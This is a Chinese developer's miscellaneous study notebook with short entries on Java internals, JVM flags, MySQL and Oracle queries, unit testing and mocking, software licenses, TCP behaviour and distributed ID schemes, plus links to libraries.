SOLID （ 单一功能、开闭原则、里氏替换、接口隔离 以及 依赖反转 ）设计原则
职责扩散,就是因为某种原因,职责P被分化为粒度更细的职责P1和P2
单一功能:每个类都应该有一个单一的功能,并且该功能应该由这个类完全封装起来

开闭原则:扩展是开放的,但是对于修改是封闭的. 抽象
里氏替换：子类可以扩展父类的功能,但不能改变父类原有的功能
接口隔离:一个类对另一个类的依赖应该建立在最小的接口上
依赖反转:抽象不应该依赖于具体实现,具体实现应该依赖于抽象 面向接口编程
--------------------------------------------------------------------------------------
https://github.com/deeplearning4j/deeplearning4j/tree/master/deeplearning4j-core/src/main/java/org/deeplearning4j/util
--------------------------------------------------------------------------------------
oracle空表分配表空间
select 'alter table '||table_name||' allocate extent;'
from user_tables where num_rows=0 or num_rows is null;
--------------------------------------------------------------------------------------
NEO4J_HOME
--------------------------------------------------------------------------------------
http://www.cnblogs.com/shangbingbing/tag/neo4j/
http://www.cnblogs.com/zhoujiagen/p/4753658.html
http://neo4j.com/docs/stable/cypher-query-lang.html
--------------------------------------------------------------------------------------
LRU (least recently used)最近最久未使用缓存  当被缓存的对象每被访问一次,这个对象的key就到链表头部
缺点是当缓存满时,不能被很快的访问
--------------------------------------------------------------------------------------
字节排序按分为大端和小端,概念如下
大端(big endian):低地址存放高有效字节
小端(little endian):低字节存放地有效字节

大端： ox 12  34    56   78 低地址->高地址
小端： ox 78  56    34   12 低地址->高地址
--------------------------------------------------------------------------------------
new Integer() 方法会在内存中新开辟一个内存空间
valueOf() 方法只有在传入的参数小于-128或大于127时,才会去调用一个new Integer()方法去创建一个新的对象 有缓存
可以通过启动参数-XX:AutoBoxCacheMax修改掉valueOf()缓存数字最大范围
-server -XX:AutoBoxCacheMax=300
-Djava.lang.Integer.IntegerCache.high=400
--------------------------------------------------------------------------------------
Collections.synchronizedList(List list) 方法也可以用来返回一个线程安全的List
--------------------------------------------------------------------------------------
怎么检测一个线程是否拥有锁
在java.lang.Thread中有一个方法叫holdsLock(),它返回true如果当且仅当当前线程拥有某个具体对象的锁

--------------------------------------------------------------------------------------
活锁和死锁的主要区别是前者进程的状态可以改变但是却不能继续执行
--------------------------------------------------------------------------------------
栈是一块和线程紧密相关的内存区域每个线程都有自己的栈内存,用于存储本地变量,方法参数和栈调用,
一个线程中存储的变量对其它线程是不可见的而堆是所有线程共享的一片公用内存区域对象都在堆里创建
--------------------------------------------------------------------------------------
 service mysqld reload
--------------------------------------------------------------------------------------
GeoHash 将一个位置信息转化成一个可以排序、可以比较的字符串编码 将二维的经纬度匹配
转为一维的匹配,降低查询效率
https://github.com/kungfoo/geohash-java

搜索一个格子,周围八个格子的数据,统一获取后再进行过滤

--------------------------------------------------------------------------------------
@MatrixVariable 多个变量可以使用";"（分号）分隔
<annotation-driven enable-matrix-variables="true" />
--------------------------------------------------------------------------------------

从5开始以步长为2或4来生成素数列表依次验证7,11,13,17,19,23,25,...等是否为素数,跳过被2,3整除的数
--------------------------------------------------------------------------------------
vertx
https://github.com/tjeubaoit/vertxlet
--------------------------------------------------------------------------------------
项目文档 HTTP协议规范 TDD SQLite

tdd 测试驱动开发
确保所有的需求都能被照顾到
在代码不断增加和重构的过程中,可以检查所有的功能是否正确
开发过程是从功能需求的test case开始,先添加一个test case,然后运行所有的test case看看有没有问题,
再实现test case所要测试的功能,然后再运行test case,查看是否有case失败,然后重构代码

TDD的悖论就在于,你在实现之前先把Test Case就写出来,所以,你怎么能保证你一开始的Test Case是适合于你后面的代码的
关注测试而不是设计
TDD导致大量的Mock和Stub

tdd与单元测试关系
单元测试 保证质量
TDD主要通过单元测试进行在编写功能代码前,先编写单元测试代码

覆盖测试  EclEmma

覆盖测试的意义,能够测试代码是否有效正确（语句测试）
同时能够检测你的单元测试是否进行了测试了所有可能的case
同时也能够测试代码部分是否全部有效（分支测试）

cobertura是一款覆盖测试的框架并且是开源框架,并且依赖于单元测试例如junit
JaCoCo 支持java8

ddd 领域驱动设计 关注的是Service层的设计,着重于业务的实现,因此不可避免的以贫血模式为基础而存在

cucumber

HttpUnit
--------------------------------------------------------------------------------------
Openresty  nginx
--------------------------------------------------------------------------------------
DBUtils dbunit dbsetup
dbunit的原理是：它会把数据库表里的数据和一个xml文件里表示的数据关联起来也就是说 数据库表里的数据可以导出到一个对应的xml里,
同时也可以将一个xml里的数据导入到数据库表里是相互转换的
数据库表里的数据<===>xml文件
--------------------------------------------------------------------------------------
https://www.liferay.com/community/forums/-/message_boards/message/4775410
--------------------------------------------------------------------------------------
com.ninja-squad DbSetup
--------------------------------------------------------------------------------------
Integer a = new Integer(1000);
    int b = 1000;
    Integer c = new Integer(10);
    Integer d = new Integer(10);
    System.out.println(a == b);  true拆箱
    System.out.println(c == d);  false new 无缓存
--------------------------------------------------------------------------------------
避免空指针 返回空集合 空对象(方法默认什么都不做)
--------------------------------------------------------------------------------------
local-name() result is without any prefix, the name() result might include a prefix
--------------------------------------------------------------------------------------
BSD开源协议
可以自由的使用,修改源代码,也可以将修改后的代码作为开源或者专有软件再发布
    如果再发布的产品中包含源代码,则在源代码中必须带有原来代码中的BSD协议
    如果再发布的只是二进制类库/软件,则需要在类库/软件的文档和版权声明中包含原来代码中的BSD协议
    不可以用开源代码的作者/机构名字和原来产品的名字做市场推广
--------------------------------------------------------------------------------------
GPL的出发点是代码的开源/免费使用和引用/修改/衍生代码的开源/免费使用,但不允许修改后和衍生的代码做为闭源的商业软件发布和销售
--------------------------------------------------------------------------------------
LGPL协议的开源代码很适合作为第三方类库被商业软件引用,但不适合希望以LGPL协议代码为基础,通过修改和衍生的方式做二次开发的商业软件采用
--------------------------------------------------------------------------------------
MIT
MIT是和BSD一样宽范的许可协议,作者只想保留版权,而无任何其他了限制 必须在你的发行版里包含原许可协议的声明
--------------------------------------------------------------------------------------
MIT > BSD > Apache > LGPL > GPL
--------------------------------------------------------------------------------------
成熟度 cmm能力成熟度模型 5级
初始级(Initial)
可重复级(Repeatable)  仔细地跟踪费用和进度
已定义级(Defined)  已为软件生产的过程编制了完整的文档
已管理级(Managed)  对每个项目都设定质量和生产目标
优化级(Optimizing)  连续地改进软件过程
--------------------------------------------------------------------------------------
禁止mysql外键约束
set foreign_key_checks = 0;
--------------------------------------------------------------------------------------
com.sun包下面的都可以通过加此参数通过编译
-XDignore.symbol.file=true
--------------------------------------------------------------------------------------
Gson解析Json字符采用的是深度优先策略
--------------------------------------------------------------------------------------
grep -i -C 5 'parttern' inputfile //打印匹配行的前后5行
统计连接数
netstat -na|grep ESTABLISHED|wc -l
--------------------------------------------------------------------------------------
junit theories 理论测试
测试被分成了两个部分：
一个是提供数据点集(比如待测试的数据)的方法,
另一个是理论本身
AssumeTrue is being used in the @BeforeClass method to check a condition before running the test suite.
 There are times when you don't want to run your test cases if some condition isn't met
--------------------------------------------------------------------------------------
select table_name, num_rows counter
  from user_tables
  where instr(table_name,'OL_GZT')>0
  and num_rows=0
  order by num_rows;
--------------------------------------------------------------------------------------
String basicAuth = "Basic " + new String(new Base64().encode(userCredentials.getBytes()));
connection.setRequestProperty ("Authorization", basicAuth);

自定义请求头
con.setRequestProperty("Test Header1", "test1");
--------------------------------------------------------------------------------------

不可重复读 另外一个事务也访问该同一数据
在一次事务中,当一行数据获取两遍得到不同的结果表示发生了不可重复读
在基于锁的并发控制中"不可重复读"现象发生在当执行SELECT操作时没有获得读锁或者SELECT操作执行完后马上释放了读锁
--------------------------------------------------------------------------------------
幻影读: 在事务执行过程中,当两个完全相同的查询语句执行得到不同的结果 插入一行新数据

--------------------------------------------------------------------------------------
不可重复读的重点是修改
幻读的重点在于新增或者删除
--------------------------------------------------------------------------------------
mysql清空查询缓存
select sql_no_cache * from ol_check_svcnum_log_201512

强制mysql从缓存中读取数据
select sql_cache * from ol_check_svcnum_log_201512

释放全部缓存
reset query cache;

查询缓存区的碎片整理
flush query cache

查看是否有查询缓存
show variables like 'have_query_cache';

0 or off 此时不会从缓存中读取查询数据
1 or on 表示除非声明了select sql_no_cache,否则都会从缓存中读取数据
2 or demand 表示所有语句都会从缓存中读取,相当于所有查询语句都使用了select sql_cache

show variables like 'query_cache_type'
show variables like 'query_cache_size'

query_cache_size=10M
query_cache_type=1
--------------------------------------------------------------------------------------
1.MySQL数据库默认安装的用户密码为空
2.所有用户拥有对于MySQL默认安装test数据库的访问权限（即使没有授予权限）
---------------------------------------------------------------------------------------

show variables like 'have_ssl';

mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/data/mysql
mysql_ssl_rsa_setup

–initialize会生成一个随机密码
而–initialize-insecure不会生成密码
–datadir目标目录下不能有数据文件
--------------------------------------------------------------------------------------
guava缓存的expireAfterWrite与refreshAfterWrite的区别
指定时间过后,expire是remove该key,下次访问是同步去获取返回新值；
而refresh则是指定时间后,不会remove该key,下次访问会触发刷新,新值没有回来时返回旧值
--------------------------------------------------------------------------------------
打开文件数限制
open_files_limit = 1024
--------------------------------------------------------------------------------------
CPU使用率,内存使用,虚拟内存交换情况,IO读写情况
vmstat第一个参数是采样的时间间隔数,单位是秒,第二个参数是采样的次数
vmstat 2 1
--------------------------------------------------------------------------------------
mysqlcheck,是mysql自带的可以检查和修复MyISAM表,并且它还可以优化和分析表
mysqlcheck的好处是不需要停止服务器来检查或修复表使用myisamchk修复失败是不可逆的
mysqlcheck -A -o -r Database_NAME -p

myisamchk：只能修复myisam表,需要停止数据库
--------------------------------------------------------------------------------------
独立表空间优点：
1 、每个表都有自己独立的表空间
2 、每个表的数据和索引都会存在自己的表空间中
3 、可以实现单表在不同的数据库中移动
--------------------------------------------------------------------------------------
MySQL生成ID
REPLACE INTO Tickets64 (stub) VALUES ('a');
SELECT LAST_INSERT_ID();
当ID生成过快时会对MySQL造成很大的压力
--------------------------------------------------------------------------------------
替换
:s/old/new用new替换行中首次出现的old
:s/old/new/g 用new替换行中所有出现的old
:#,# s/old/new/g用new替换从第＃行到第＃行中出现的old
--------------------------------------------------------------------------------------
XML/XSL 中间件 持续集成 工具
--------------------------------------------------------------------------------------
持续集成指的是,频繁地（一天多次）将代码集成到主干
快速发现错误
防止分支大幅偏离主干

目的,就是让产品可以快速迭代,同时还能保持高质量
jenkins
--------------------------------------------------------------------------------------
单元测试针对的目标是局部而非整体,而持续集成面对的是整体 mock的代价
--------------------------------------------------------------------------------------
mock和stub  --mockio 中代码使用

Stub和Mock都是属于测试替身,对类型细分的话可以分为：
Dummy Object 哑对象 仅仅是需要使用它来通过编译,实际上用不到它
Fake Object 假对象 假对象适用于替换产品代码中使用的全局对象,或者创建的类  基于内存的数据库
Test Stub 测试桩 测试桩需要注入到产品代码中,从而在测试产品代码时替换组件,执行桩的行为 邮件网关的stub 会记录它发送的消
Test Spy  可以记录桩使用的记录,并进行验证
Mock Object 模拟对象 设定产品代码中耦合的类的期望的行为,然后验证期望的行为是否发生
前四项属于Stub,最后的Mock Object属于Mock

mock spy
都要注入到产品代码中
不同的

Mock是替换整个被Mock的类,这个类可以存在也可以不存在而Spy是使用一个已经存在的类,嗅探其中的部分方法
从流程中来说,Mock是先设定被Mock的类的期望行为,然后验证期望的行为是否发生 调用了几次、在某种情况下是否会抛出异常
Spy是记录下桩的方法的使用记录（如传入的参数,调用的次数等）,然后再对记录进行验证

spy 可以修改某个真实对象的某些方法的行为特征,而不改变他的基本行为特征
--------------------------------------------------------------------------------------
使用Mock/Stub的目的,去代替那些被测试代码所依赖的,但不可信赖的东西

用stub去fake（伪造）一个方法,阻断原来方法的调用
mock就是stub + expectation, 说它是stub是因为它也可以像stub一样伪造方法,阻断对原来方法的调用, expectation是说它不仅伪造了这个方法,还期望你(必须)调用这个方法,如果没有被调用到,这个test就fail了

--------------------------------------------------------------------------------------
mock对象就是在调试期间用来作为真实对象的替代品
mock测试就是在测试过程中,对那些不容易构建的对象用一个虚拟对象来代替测试的方法就叫mock测试
--------------------------------------------------------------------------------------
stub 可以理解为测试桩,它能实现当特定的方法被调用时,返回一个指定的模拟值
spy 可以理解为侦查,它负责汇报情况,持续追踪什么方法被调用了,以及调用过程中传递了哪些参数你能用它来实现测试断言

--------------------------------------------------------------------------------------
mysql 表分区  最多可以分多少个区 一个数据表最多只能有1024个分区
--------------------------------------------------------------------------------------
oracle 添加多个字段
alter table T_54 add (name varchar2(15), name2 varchar2(4));


--------------------------------------------------------------------------------------
oracle表名长度 30 列名长度30 索引名长度30
describe all_tab_columns

mysql表名长度64 列名长度64 索引名长度64
--------------------------------------------------------------------------------------
HTTPS->HTTP时带上referer, 一些浏览器(目前是chrome/safari)支持名为"referrer"的<meta>
<meta content="always" name="referrer">
--------------------------------------------------------------------------------------
ESB是服务集中化,SOA是业务拆分专业化
--------------------------------------------------------------------------------------
ControlsFX、FindBugs及Property Alliance
--------------------------------------------------------------------------------------
maven 更新整个项目版本号
mvn versions:set -DnewVersion=1.0.1-SNAPSHOT
--------------------------------------------------------------------------------------
mysql日期文件名
my.ini 只能产生在secure-file-priv下面

SET @SqlScript= CONCAT("SELECT * INTO OUTFILE 'C:/ProgramData/MySQL/MySQL Server 5.7/Uploads/sql_out_", DATE_FORMAT(NOW(), '%Y%m%d%H%i%s'), ".txt' FROM `t_user`;");

PREPARE Sql_Text FROM @SqlScript;

EXECUTE Sql_Text;
--------------------------------------------------------------------------------------
mysql> \s 服务器状态  \h帮助
--------------------------------------------------------------------------------------
查看支持的字符集
show charset
show collation;
--------------------------------------------------------------------------------------
Math.abs负数
a<0:-a:a  a为Integer最小值时返回负数
--------------------------------------------------------------------------------------
select concat(convert(login_id,char),convert(busi_type,char),convert(create_date,char)) as str
from ol_login_log_201412
--------------------------------------------------------------------------------------
函数的定义需要关键字def,组成部分有函数名（main）,参数名称(args), 参数类型(Array[String]),返回类型(Unit),大括号内是函数体

Scala的类中并没有静态函数,所以引入object来持有静态函数
--------------------------------------------------------------------------------------
Gradle Groovy
--------------------------------------------------------------------------------------
2FA 双因子认证
双因子认证为登录流程提供额外的安全保护它要求您同时知道自己的电子邮件地址和密码,并提供从第二装置（通常为手机）上获取的验证码

Time-based One-time Password Algorithm (TOTP) algorithm
http://en.wikipedia.org/wiki/Time-based_One-time_Password_Algorithm
TOTP（基于时间的一次性密码算法）是支持时间作为动态因素基于HMAC一次性密码算法的扩展

Prover与Verifier之间必须时钟同步；
Prover与Verifier之间必须共享密钥；
Prover与Verifier之间必须使用相同的时间步长

每次使用相同的密钥种子和时间戳的组合总会生成一个相同的动态口令
而密钥种子是个不变量同时在攻击中不可控,因此只要控制了时间戳那么即可生成任意时间戳所对应的动态口令

--------------------------------------------------------------------------------------
java.lang.Class.getComponentType()
方法返回类的组件类型的数组如果这个类并不代表一个数组类,此方法返回null


--------------------------------------------------------------------------------------
https://github.com/reactor/reactive-streams-commons
https://github.com/ctrl-alt-dev/json-transform
https://github.com/jwhitbeck/java-rdb-parser

https://github.com/jsurfer/JsonSurfer  big json
https://github.com/bazaarvoice/jolt
https://github.com/damianszczepanik/silencio
https://github.com/acesinc/json-data-generator
--------------------------------------------------------------------------------------
Java Class 文件结构

一个 Java Class 文件包括 10 个基本组成部分：

魔数: 0xCAFEBABE
Class 文件格式版本号：class 文件的主次版本号（the minor and major versions）
常量池（Constant Pool）：包含 class 中的所有常量
访问标记（Access Flags）：例如该 class 是否为抽象类、静态类,等等
该类（This Class）：当前类的名称
父类（Super Class）：父类的名称
接口（Interfaces）：该类的所有接口
字段（Fields）：该类的所有字段
方法（Methods）：该类的所有方法
属性（Attributes）：该类的所有属性（例如源文件名称,等等）
--------------------------------------------------------------------------------------
javap 命令行工具查看任意 Java Class 文件的版本号
javap -verbose MyClass major version
--------------------------------------------------------------------------------------
JMockit元素
@Tested和@Injectable:
对@Tested对象判断是否为null,是则通过合适构造器初始化,并实现依赖注入
调用构造方法时,会尝试使用@Injectable的字段进行构造器注入
普通注入时,@Injectable字段如果没有在测试方法前被赋值,
其行为将会被mock成默认值(静态方法和构造函数不会被mock掉)
Injectable最大作用除了注入,还有就是mock的范围只限当前注释实例

@Injectable的实例会自动注入到@Tested中,如果没初始赋值,那么JMockit将会以相应规则初始化

@Tested        // 表明被修饰实例是将会被自动构建和注入的实例
@Injectable   // 表明被修饰实例将会自动注入到@Tested修饰的实例中,并且会自动mock掉,除非在测试前被赋值
@Mocked(methods="tryIt")  // 表明被修饰的类对tryIt()方法进行mock
 invoke()能调用私有方法
 getField()能操作私有成员
--------------------------------------------------------------------------------------
@Mocked修饰的实例,将会把实例对应类的所有实例的所有行为都mock掉（无论构造方法,还是private,protected方法)
在Expectation区块中,声明的成员变量均默认带有@Mocked,
@Mocked会mock掉所有方法,如果某些函数我们不希望它也被mock,可以通过methods="methodName"来设置被mock的类只对methodName方法进行mock
或者通过Expectation构造函数传入Class对象或Instance对象,这样只会区块内Class或Instance对应的行为进行mock

可以使用MockUp来创建一个"fake"的实例,对某个方法指定自己的实现,而不是调用实际的方法
--------------------------------------------------------------------------------------
JMockit内部使用ASM库来动态修改java的字节码
jmockit先通过Mocked注解标记需要Mock掉的类然后调用new MockUp去创建修改后的class文件
在JVM运行的时候,通过JDK6之后的动态Instrumentation特性监听类加载事件,并在目标类加载之前移花接木

JMockit有两种Mock方式：基于行为的Mock方式和基于状态的Mock方式
1.录制方法预期行为
2.真实调用
3.验证录制的行为被调用
--------------------------------------------------------------------------------------
querydsl
xrebel
-Xms256m -Xmx256m -XX:MaxNewSize=256m -XX:MaxPermSize=256m -javaagent:d:/xrebel/xrebel.jar
--------------------------------------------------------------------------------------
map不区分大小写 key key不能为空
Map<String, Integer> lookup = new TreeMap<String, Integer>(String.CASE_INSENSITIVE_ORDER);


class CaseInsensitiveComparator implements Comparator<String> {
   public static final CaseInsensitiveComparator INSTANCE = new CaseInsensitiveComparator();
   public int compare(String first, String second) {
	if(first==null){
	  return second==null?0:1;
	}
	  return first.compareToIgnoreCase(second);
	}
}

key可以为空 apache collection
Map<String, Integer> treeMap = new CaseInsensitiveMap<String, Integer>();
Map<String, Integer> treeMap = new TreeMap<String, Integer>(Comparator.nullsLast(String.CASE_INSENSITIVE_ORDER));

默认key不能为空
Map<String, Integer> treeMap = new TreeMap<String, Integer>();

HashMap的存储位置是按照key这个对象的hashCode来存放的,
TreeMap按照实现的Comparable接口的compareTo这个方法来存储的

SortedMap也是一个结构,待排序的Map,其一个比较常用的实现类是TreeMap
TreeMap的put(K key, V value)方法在每添加一个元素时,都会自动排序

--------------------------------------------------------------------------------------
打开文件限制
show variables like 'open_files_limit'
--------------------------------------------------------------------------------------
编码标准：CheckStyle 插件
代码重复：PMD的CPD 插件
代码覆盖率：Eclemma 插件
依赖项分析：JDepend 插件
复杂度分析：Eclipse Metric 插件
--------------------------------------------------------------------------------------
内存数据库Hazelcast
--------------------------------------------------------------------------------------
https://github.com/arnaudroger/SimpleFlatMapper
解析1993,Chevy,"Venture ""Extended Edition""","",4900.00有问题
--------------------------------------------------------------------------------------
strictfp, 即 strict float point (精确浮点)
使用 strictfp 关键字声明一个方法时,该方法中所有的float和double表达式都严格遵守FP-strict的限制,符合IEEE-754规范
当对一个类或接口使用 strictfp 关键字时,该类中的所有代码,包括嵌套类型中的初始设定值和代码,都将严格地进行计算
严格约束意味着所有表达式的结果都必须是 IEEE 754 算法对操作数预期的结果,以单精度和双精度格式表示
IEEE的浮点也不是精确的
--------------------------------------------------------------------------------------
eclipse maven项目debug无源码
在source里面加入workspace就可以了,另外如果是多项目勾选Resolve workspace atifacts
--------------------------------------------------------------------------------------
https undertow
--------------------------------------------------------------------------------------
如果这个对象没有进行初始化或者为Null,在自动拆箱过程中obj.xxxValue,会抛出NullPointerException
Integer count;//null
if(count<0)
--------------------------------------------------------------------------------------
int i = 5;
long j = 8;
i = i + j;//错误
//E1 op= E2 型的复合赋值表达式等价于 E1 = (T)((E1) op (E2)),这里 T 是 E1 的类型,不同的是 E1 只计算一次
i += j;//正确


--------------------------------------------------------------------------------------
项目->属性->Deployment Assembly->Add->Java Build Path Entries-> Maven Dependencies -> Finish
--------------------------------------------------------------------------------------
json value:string number object array true false null
--------------------------------------------------------------------------------------
Collections.singletonMap("a", "a-val") 不可变map
--------------------------------------------------------------------------------------
&&-->||
--------------------------------------------------------------------------------------
linux 查询系统负载信息   uptime

--------------------------------------------------------------------------------------
xml csv json测试200万入表  已完成
--------------------------------------------------------------------------------------
为什么要把Bean(POJO)的大部分成员变量私有化,然后提供getter和setter方法
隐藏类的具体实现细节因为成员变量是类的重要组成部分,有些变量信息不能直接暴露给使用者
控制 >0
--------------------------------------------------------------------------------------
svn目录过滤
properties -> Resource ->ResourceFilters->Add,在弹出的面板中选择Exclude All ->Files and Folders->All children (recursive) ,输入框中输入*.svn
--------------------------------------------------------------------------------------
https://github.com/speedment/speedment
--------------------------------------------------------------------------------------
http://mp.weixin.qq.com/s?__biz=MzA5ODM5MDU3MA==&mid=401675719&idx=1&sn=7aaa44333f9f7011857851014e6072cb&scene=23&srcid=0108iZa4nEtyMTTHrjkTGJiC#rd

--------------------------------------------------------------------------------------
map<String> map.get(1)=null map.get("1") 类型一致
--------------------------------------------------------------------------------------
并行流需要满足以下2个要求：
恒等性：初始值必须为组合函数的恒等值,拿恒等值和其他值做reduce操作时,其他值保持不变
组合律：改变组合操作的顺序不会影响最终的结果
--------------------------------------------------------------------------------------
http://colobu.com/categories/Scala/
--------------------------------------------------------------------------------------
mysql 计算两坐标间的距离 mysql 5.6版本
select
    st_distance (
		point (113.327955, 23.129717),
		point (113.327955, 20.129717)
	) * 111195 as distance
from dual

astext函数把数据库内部存储的几何对象格式化成一个字符串
select astext(point(113.327955, 23.129717))
from dual

st_distance 计算的结果单位是 度,需要乘111195（地球半径6371000*PI/180） 是将值转化为米

select y(point (113.327955, 23.129717)) as lng 经度23,
       x(point (113.327955, 23.129717)) as lat 纬度113
from dual

select geomfromtext('point(113.327955 23.129717)')
from dual

geomfromtext 函数接受一个字符串,并且返回一个几何对象
select geomfromtext('polygon((0 0,10 0,10 10,0 10,0 0))')
from dual

select linestring(point(113.327955, 23.129717),point(113.327955, 23.129717))
from dual

把指定的几何对象转变易读的文本
select astext(envelope(geomfromtext('linestring(1 1,2 2)')));

返回指定几何对象的类型：
select geometrytype(geomfromtext('point(1 1)'));

返回指定几何对象的类型：
select geometrytype(envelope(geomfromtext('linestring(1 1,2 2)')));

查找指定矩形范围内的点：
set @bbox ='polygon((0 0, 10 0, 10 10, 0 10, 0 0))';
select id, astext(my_point)
  from tmysql_test_point
 where intersects(my_point, geomfromtext(@bbox));

查询圆形区域（通常用一个中心点和半径来表示）内的几何对象
set @point ='point(10 10)';
set @radius = 3;
select id, astext(my_point)
  from tmysql_test_point
 where distance(my_point, geomfromtext(@point)) < @radius;

返回linestring值1s的最后一个点的point
set @ls = 'linestring(1 1,2 2,3 3)';
select astext(endpoint(geomfromtext(@ls)));

http://www.iteedu.com/database/mysql/mysqlmanualcn/spatial-extensions-in-mysql/
--------------------------------------------------------------------------------------
http://mathparser.org/ math库
https://github.com/mariuszgromada/MathParser.org-mXparser/tree/master/STABLE/2.1.1
--------------------------------------------------------------------------------------
查询当前进程
select user,state,count(1) from information_schema.processlist group by user,state;
--------------------------------------------------------------------------------------
https://github.com/aol/cyclops
https://github.com/freiheit-com/fuava_simplebatch
--------------------------------------------------------------------------------------
不可变集合都不能序列化

--------------------------------------------------------------------------------------
MESI协议－CPU缓存一致性协议  MESI协议的核心却是MESI消息和状态转移
MESI协议中的状态
M: 被修改（Modified)
E: 独享的（Exclusive) (注：一个核独享变量)  缓存行还没有被相应的 CPU 修改
S: 共享的（Shared)
I: 无效的（Invalid）

只要缓存的状态不是I都可以从缓存中读,否则就要从主存中读这一读操作可能会被某个处于M或E状态的CPU截获,
该CPU将修改的数据写出到内存,并将自己设为S状态后这一读操作才继续进行
一个写请求只有在该缓存行是M或者E状态时才能被执行
缓存可以随时将一个非M状态的缓存行作废,或者变成Invalid状态,而一个M状态的缓存行必须先被写回主存

当CPU写数据时,如果发现操作的变量是共享变量,即在其他CPU中也存在该变量的副本,会发出信号通知其他CPU将该变量的缓存行置为无效状态,
因此当其他CPU需要读取这个变量时,发现自己缓存中缓存该变量的缓存行是无效的,那么它就会从内存重新读取
--------------------------------------------------------------------------------------
volatile告诉jvm, 它所修饰的变量不保留拷贝,直接访问主内存中的  保证可见性
volatile不能保证操作的原子性 volatile只能保证他们操作的i是同一块内存
禁止进行指令重排序

对变量的写操作不依赖于当前值  double check 状态标记量
该变量没有包含在具有其他变量的不变式中

通过synchronized和Lock也能够保证可见性,synchronized和Lock能保证同一时刻只有一个线程获取锁然后执行同步代码,并且在释放锁之前会将对变量的修改刷新到主存当中
--------------------------------------------------------------------------------------
把堆划分为新生代和老年代有 2 个好处：简化了新对象的分配 (只在新生代分配内存), 可以更有效的清除不再需要的对象
新生代大小 -XX:NewSize and -XX:MaxNewSize
设置新生代和老年代的相对大小 -XX:NewRatio

大对象直接进入老年代 很长的字符串以及数组
-XX:PretenureSizeThreshold参数,令大于这个设置值的对象直接在老年代分配

长期存活的对象将进入老年代 -XX:MaxTenuringThreshold 晋升老年代的年龄阈值
--------------------------------------------------------------------------------------
jps
jinfo pid 打印jvm配置信息
jinfo -flag MaxNewSize 2836
--------------------------------------------------------------------------------------
锁可以升级但不能降级,意味着偏向锁升级成轻量级锁后不能降级成偏向锁目的是为了提高获得锁和释放锁的效率

偏向锁的目的是在某个线程获得锁之后,消除这个线程锁重入（CAS）的开销,看起来让这个线程得到了偏护

自旋:就是让线程去执行一个无意义的循环,循环结束后再去重新竞争锁

偏向锁	加锁和解锁不需要额外的消耗,和执行非同步方法比仅存在纳秒级的差距 适用于只有一个线程访问同步块场景
轻量级锁 竞争的线程不会阻塞,提高了程序的响应速度	追求响应时间,锁占用时间很短
--------------------------------------------------------------------------------------
Externalizable接口extends Serializable接口,而且在其基础上增加了两个方法：writeExternal()和readExternal()
这两个方法会在序列化和反序列化还原的过程中被自动调用,以便执行一些特殊的操作
必须有权限为public的默认的构造器
--------------------------------------------------------------------------------------
mysql 带-N的查询语句,查询结果中不带字段名
mysql -N -h xxxx -P 8000 -u'xxx' -p'xxx' -D xxdb
-e "select name from Person where name = 'A'";

--------------------------------------------------------------------------------------
HTTP 1.1支持持久连接,在一个TCP连接上可以传送多个HTTP请求和响应,减少了建立和关闭连接的消耗和延迟
   Connection请求头的值为Keep-Alive时
多个请求和响应可以重叠,多个请求和响应可以同时进行
http 1.1 range:bytes=XXXX表示要求服务器从文件XXXX字节处开始传送 断点续传 服务器相应地返回了对象所请求范围的内容,则响应码为206
HTTP1.1在Request消息头里头多了一个Host域

HTTP1.1 增加的新的status code
100 Continue 客户端事先发送一个只带头域的请求 服务器接收此请求就回送响应码100,客户端就可以继续发送带实体的完整请求
101 Switching Protocols
--------------------------------------------------------------------------------------
测试最大内存 java -Xmx150m -version
--------------------------------------------------------------------------------------
linux
增大最大打开文件数限制
security/limits.conf
* soft nofile 10240
* hard nofile 10240

查看所有进程的文件打开数
    lsof |wc -l
查看某个进程打开的文件数
    lsof -p pid |wc -l
--------------------------------------------------------------------------------------
分布式唯一id
1 uuid
2 MongoDB ObjectID 12byte
create table tickets64 (
  id bigint(20) unsigned not null auto_increment,
  stub char(1) not null default '',
  primary key  (id),
  unique key stub (stub)
)

replace into tickets64 (stub) values ('a');
select last_insert_id();

一个奇数 一个偶数
auto-increment-increment = 2
auto-increment-offset = 1

auto-increment-increment = 2
auto-increment-offset = 2

主机编号为i,以i为初始值,以K为步长自增缺点,不能动态扩展
snowflake

1 设置主键自增为何不可取
这样的话,数据库本身是单点,不可拆库,因为id会重复

2 依赖数据库自增机制达到全局ID唯一
使用如下语句：
REPLACE INTO Tickets64 (stub) VALUES ('a');
SELECT LAST_INSERT_ID();
这样可以保证全局ID唯一,但这个Tickets64表依旧是个单点


解决每次请求全局ID都读库写库压力过大的问题
比如第一次启动业务服务,会请求一个唯一id为3559
如果是2、3的方法,则id为3559,这样每次都请求数据库,对数据库压力比较大
可以用3559 * 65536（举个例子,并不一定是65536）+ 内存自增变量来作为id
当内存自增变量到达65535时,从数据库重新获取一个自增id
这样即使有多台业务服务器,id也不会重复：
第一台 3559 * 65536 + 1,2,3.....65535
第二台 3560 * 65536 + 1,2,3.....65535
然后第一台到65535了,换一个数据库自增id,这时候可能是3561 * 65536 + 1,2,3....
--------------------------------------------------------------------------------------
close_wait状态的话,说明套接字是被动关闭 在连接被动关闭后,没有发送FIN报文段到对方

time_wait：表示主动关闭 time_wait是主动关闭连接的一方保持的状态 服务器能够快速回收和重用那些TIME_WAIT的资源
etc/sysctl.conf
#表示开启重用允许将TIME-WAIT sockets重新用于新的TCP连接,默认为0,表示关闭
net.ipv4.tcp_tw_reuse = 1
#表示开启TCP连接中TIME-WAIT sockets的快速回收,默认为0,表示关闭
net.ipv4.tcp_tw_recycle = 1
#表示当keepalive起用的时候,TCP发送keepalive消息的频度缺省是2小时,改为300秒
net.ipv4.tcp_keepalive_time=1200
#表示如果套接字由本端要求关闭,这个参数决定了它保持在FIN-WAIT-2状态的时间
net.ipv4.tcp_fin_timeout=30

执行/sbin/sysctl -p
--------------------------------------------------------------------------------------
频率限制的话,可以使用Guava的RateLimiter
--------------------------------------------------------------------------------------
有1亿个数字,其中有2个是重复的,快速找到它,时间和空间要最优
答：构造一个位图或者布隆过滤器的容器,遍历1亿个数字,依次放入容器,在放入过程中可检测到是否重复
         时间复杂度为O(n)
--------------------------------------------------------------------------------------
TCP三次握手和四次挥手的流程,为什么断开连接要4次
  答：假设客户端为C,服务端为S
         连接： C -> syn   S-> ack、syn  C->ack
         断开： C -> fin   S->ack   S->fin   C->ack
         为什么连接要三次？为了防止已经失效的连接请求报文又传到了服务端,因而产生错误
